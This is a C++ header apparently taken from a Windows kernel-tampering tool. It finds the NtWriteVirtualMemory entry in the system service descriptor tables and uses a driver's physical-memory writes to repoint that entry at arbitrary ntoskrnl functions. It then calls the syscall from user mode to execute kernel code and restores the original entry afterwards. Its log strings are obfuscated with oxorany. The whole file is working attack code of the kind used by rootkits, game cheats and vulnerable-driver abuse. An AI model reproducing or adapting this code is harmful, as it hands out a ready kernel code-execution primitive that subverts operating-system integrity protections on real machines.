#pragma once
#include <shared_mutex>
#include <vector>

namespace syscall {
    class c_syscall {
    public:
        bool setup( ) {
            const auto ntos = g_pdb->m_module_base;
            if ( !ntos ) {
                logging::print( oxorany( "Failed to resolve ntoskrnl base" ) );
                return false;
            }
            m_ntos_base = ntos;
            m_ntos_end = ntos + ntos_image_size( ntos );
            if ( m_ntos_end <= m_ntos_base ) {
                logging::print( oxorany( "Failed to resolve ntoskrnl size" ) );
                return false;
            }

            m_nt_write = g_pdb->get_symbol_address( oxorany( "NtWriteVirtualMemory" ) );
            if ( !in_ntos( m_nt_write ) ) {
                logging::print( oxorany( "Failed to resolve NtWriteVirtualMemory inside ntoskrnl" ) );
                return false;
            }

            m_ssn = ntdll_ssn( "NtWriteVirtualMemory" );

            const auto primary = g_pdb->get_symbol_address( oxorany( "KeServiceDescriptorTable" ) );
            if ( !add_table_slot( primary, m_nt_write ) ) {
                logging::print( oxorany( "Failed to locate NtWriteVirtualMemory in SSDT" ) );
                return false;
            }

            const auto shadow = g_pdb->get_symbol_address( oxorany( "KeServiceDescriptorTableShadow" ) );
            if ( shadow && shadow != primary )
                add_table_slot( shadow, m_nt_write );

            if ( !slots_match_original( ) ) {
                logging::print( oxorany( "SSDT slot decode does not match NtWriteVirtualMemory" ) );
                return false;
            }

            logging::print( oxorany( "Kernel execution ready (%zu SSDT slot(s), original 0x%08x)" ),
                m_slots.size( ), m_slots[ 0 ].original );
            return true;
        }

        bool in_ntos( std::uint64_t va ) const {
            return va >= m_ntos_base && va < m_ntos_end;
        }

        bool in_ntos_range( std::uint64_t va, std::size_t size ) const {
            if ( !va || !size )
                return false;
            if ( va < m_ntos_base )
                return false;
            const auto end = va + size;
            if ( end < va )
                return false;
            return end <= m_ntos_end;
        }

        bool refresh_after_paging( ) {
            std::unique_lock lock( m_lock );
            if ( !refresh_slot_pas( ) ) {
                logging::print( oxorany( "SSDT slot PA refresh failed after paging change" ) );
                return false;
            }
            if ( slots_match_original( ) )
                return true;
            logging::print( oxorany( "SSDT no longer NtWriteVirtualMemory after paging change; restoring" ) );
            restore_slots( );
            if ( !slots_match_original( ) ) {
                logging::print( oxorany( "SSDT restore after paging change failed" ) );
                return false;
            }
            return true;
        }

        bool force_restore( ) {
            std::unique_lock lock( m_lock );
            restore_slots( );
            return slots_match_original( );
        }

        bool emergency_restore( ) {
            restore_slots( );
            return slots_match_original( );
        }

        bool verify_restored( ) {
            std::unique_lock lock( m_lock );
            if ( !refresh_slot_pas( ) )
                return false;
            return slots_match_original( );
        }

        template<typename ret_t = std::uint64_t,
            typename a1_t = void*, typename a2_t = void*,
            typename a3_t = void*, typename a4_t = void*,
            typename a5_t = void*, typename a6_t = void*,
            typename a7_t = void*, typename a8_t = void*,
            typename a9_t = void*, typename a10_t = void*>
        ret_t call_kernel( std::uint64_t func,
            a1_t  a1 = {}, a2_t  a2 = {}, a3_t  a3 = {},
            a4_t  a4 = {}, a5_t  a5 = {}, a6_t  a6 = {},
            a7_t  a7 = {}, a8_t  a8 = {}, a9_t  a9 = {},
            a10_t a10 = {} ) {

            if ( m_slots.empty( ) ) {
                logging::print( oxorany( "Kernel execution is not initialized" ) );
                if constexpr ( std::is_void_v<ret_t> ) return;
                else return ret_t{};
            }

            if ( !in_ntos( func ) ) {
                logging::print( oxorany( "Refusing SSDT hijack to non-ntos 0x%llx" ), func );
                if constexpr ( std::is_void_v<ret_t> ) return;
                else return ret_t{};
            }

            if ( !g_paging->is_mapped_executable( func ) ) {
                logging::print( oxorany( "Refusing SSDT hijack to unmapped/NX 0x%llx" ), func );
                if constexpr ( std::is_void_v<ret_t> ) return;
                else return ret_t{};
            }

            std::unique_lock lock( m_lock );

            if ( !refresh_slot_pas( ) ) {
                logging::print( oxorany( "SSDT slot PA refresh failed" ) );
                if constexpr ( std::is_void_v<ret_t> ) return;
                else return ret_t{};
            }

            if ( !slots_match_original( ) ) {
                restore_slots( );
                if ( !slots_match_original( ) ) {
                    logging::print( oxorany( "Refusing SSDT hijack; leftover handler is not NtWriteVirtualMemory" ) );
                    if constexpr ( std::is_void_v<ret_t> ) return;
                    else return ret_t{};
                }
            }

            std::vector< std::uint32_t > encoded;
            encoded.reserve( m_slots.size( ) );
            for ( const auto& slot : m_slots ) {
                std::uint32_t new_entry = 0;
                if ( !encode( func, slot.table_base, slot.original & 0xFu, &new_entry ) ) {
                    logging::print( oxorany( "SSDT encode overflow for 0x%llx" ), func );
                    if constexpr ( std::is_void_v<ret_t> ) return;
                    else return ret_t{};
                }
                if ( decode( slot.table_base, new_entry ) != func ) {
                    logging::print( oxorany( "SSDT encode round-trip mismatch for 0x%llx" ), func );
                    if constexpr ( std::is_void_v<ret_t> ) return;
                    else return ret_t{};
                }
                encoded.push_back( new_entry );
            }

            struct restorer_t {
                c_syscall* self;
                ~restorer_t( ) {
                    if ( !self )
                        return;
                    self->restore_slots( );
                    if ( !self->slots_match_original( ) ) {
                        self->restore_slots( );
                        if ( !self->slots_match_original( ) )
                            logging::print( oxorany( "SSDT leftover hijack remains after restore" ) );
                    }
                }
            } restorer{ this };

            for ( std::size_t idx = 0; idx < m_slots.size( ); idx++ ) {
                if ( !g_driver->write_physical_memory(
                    m_slots[ idx ].entry_pa, &encoded[ idx ], sizeof( encoded[ idx ] ) ) ) {
                    if constexpr ( std::is_void_v<ret_t> ) return;
                    else return ret_t{};
                }
            }

            using fn_t = void* ( __stdcall* )(
                a1_t, a2_t, a3_t, a4_t, a5_t,
                a6_t, a7_t, a8_t, a9_t, a10_t );

            auto nt_fn = reinterpret_cast<fn_t>(
                GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtWriteVirtualMemory" ) );

            void* result = nullptr;
            if ( nt_fn )
                result = nt_fn( a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 );

            if constexpr ( std::is_void_v<ret_t> ) return;
            else return reinterpret_cast<ret_t>( result );
        }

    private:
        struct slot_t {
            std::uint64_t table_base;
            std::uint64_t entry_va;
            std::uint64_t entry_pa;
            std::uint32_t original;
        };

        static std::uint64_t ntos_image_size( std::uint64_t ntos ) {
            dos_header_t dos{};
            if ( !g_paging->read_virtual_memory( ntos, &dos, sizeof( dos ) ) )
                return 0;
            nt_headers_t nt{};
            if ( !g_paging->read_virtual_memory( ntos + dos.m_lfanew, &nt, sizeof( nt ) ) )
                return 0;
            return nt.m_size_of_image;
        }

        static std::uint32_t ntdll_ssn( const char* name ) {
            auto* p = reinterpret_cast<const std::uint8_t*>(
                GetProcAddress( GetModuleHandleA( "ntdll.dll" ), name ) );
            if ( !p )
                return ~0u;
            if ( p[ 0 ] == 0xF3 && p[ 1 ] == 0x0F && p[ 2 ] == 0x1E && p[ 3 ] == 0xFA )
                p += 4;
            for ( int idx = 0; idx < 32; idx++ ) {
                if ( p[ idx ] == 0xB8 )
                    return *reinterpret_cast<const std::uint32_t*>( p + idx + 1 );
            }
            return ~0u;
        }

        static bool encode( std::uint64_t func, std::uint64_t base, std::uint32_t argc_nibble, std::uint32_t* out ) {
            const auto delta = static_cast<std::int64_t>( func ) - static_cast<std::int64_t>( base );
            if ( delta > 0x07FFFFFFLL || delta < -0x08000000LL )
                return false;
            *out = ( static_cast<std::uint32_t>( static_cast<std::int32_t>( delta ) ) << 4 ) | ( argc_nibble & 0xF );
            return true;
        }

        static std::uint64_t decode( std::uint64_t base, std::uint32_t entry ) {
            const auto rel = static_cast<std::int32_t>( entry ) >> 4;
            return static_cast<std::uint64_t>( static_cast<std::int64_t>( base ) + rel );
        }

        bool read_entry( const slot_t& slot, std::uint32_t* out ) const {
            if ( !out || !slot.entry_pa )
                return false;
            return g_driver->read_physical_memory( slot.entry_pa, out, sizeof( *out ) );
        }

        bool refresh_slot_pas( ) {
            for ( auto& slot : m_slots ) {
                const auto pa = g_paging->translate_linear( slot.entry_va );
                if ( !pa )
                    return false;
                slot.entry_pa = pa;
            }
            return true;
        }

        bool slots_match_original( ) const {
            if ( m_slots.empty( ) || !in_ntos( m_nt_write ) )
                return false;
            for ( const auto& slot : m_slots ) {
                std::uint32_t live = 0;
                if ( !read_entry( slot, &live ) )
                    return false;
                if ( live != slot.original )
                    return false;
                if ( decode( slot.table_base, live ) != m_nt_write )
                    return false;
            }
            return true;
        }

        bool add_table_slot( std::uint64_t descriptor_va, std::uint64_t nt_write ) {
            if ( !descriptor_va )
                return false;

            std::uint64_t desc[ 4 ]{};
            if ( !g_paging->read_virtual_memory( descriptor_va, desc, sizeof( desc ) ) )
                return false;

            const auto table_base = desc[ 0 ];
            const auto count = static_cast<std::uint32_t>( desc[ 2 ] );
            if ( !table_base || count == 0 || count > 0x1000 )
                return false;

            if ( !in_ntos( table_base ) )
                return false;

            std::vector<std::uint32_t> table( count );
            if ( !g_paging->read_virtual_memory( table_base, table.data( ), count * sizeof( std::uint32_t ) ) )
                return false;

            std::uint32_t want = 0;
            if ( !encode( nt_write, table_base, 0, &want ) )
                return false;
            want &= 0xFFFFFFF0u;

            auto try_index = [ & ]( std::uint32_t idx ) -> bool {
                if ( idx >= count )
                    return false;
                if ( ( table[ idx ] & 0xFFFFFFF0u ) != want )
                    return false;

                slot_t slot{};
                slot.table_base = table_base;
                slot.original = table[ idx ];
                slot.entry_va = table_base + static_cast<std::uint64_t>( idx ) * sizeof( std::uint32_t );
                slot.entry_pa = g_paging->translate_linear( slot.entry_va );
                if ( !slot.entry_pa )
                    return false;
                if ( decode( slot.table_base, slot.original ) != nt_write )
                    return false;

                for ( const auto& existing : m_slots ) {
                    if ( existing.entry_pa == slot.entry_pa )
                        return true;
                }

                m_slots.push_back( slot );
                logging::print( oxorany( "SSDT 0x%llx index %u (0x%08x)" ),
                    table_base, idx, slot.original );
                return true;
            };

            if ( m_ssn != ~0u && try_index( m_ssn ) )
                return true;

            for ( std::uint32_t idx = 0; idx < count; idx++ ) {
                if ( try_index( idx ) )
                    return true;
            }
            return false;
        }

        void restore_slots( ) {
            for ( auto& slot : m_slots ) {
                const auto fresh = g_paging->translate_linear( slot.entry_va );
                if ( fresh )
                    slot.entry_pa = fresh;
                if ( !slot.entry_pa )
                    continue;
                g_driver->write_physical_memory( slot.entry_pa, &slot.original, sizeof( slot.original ) );
            }
        }

        std::shared_mutex     m_lock{};
        std::vector< slot_t > m_slots{};
        std::uint64_t         m_ntos_base{ 0 };
        std::uint64_t         m_ntos_end{ 0 };
        std::uint64_t         m_nt_write{ 0 };
        std::uint32_t         m_ssn{ ~0u };
    };
}
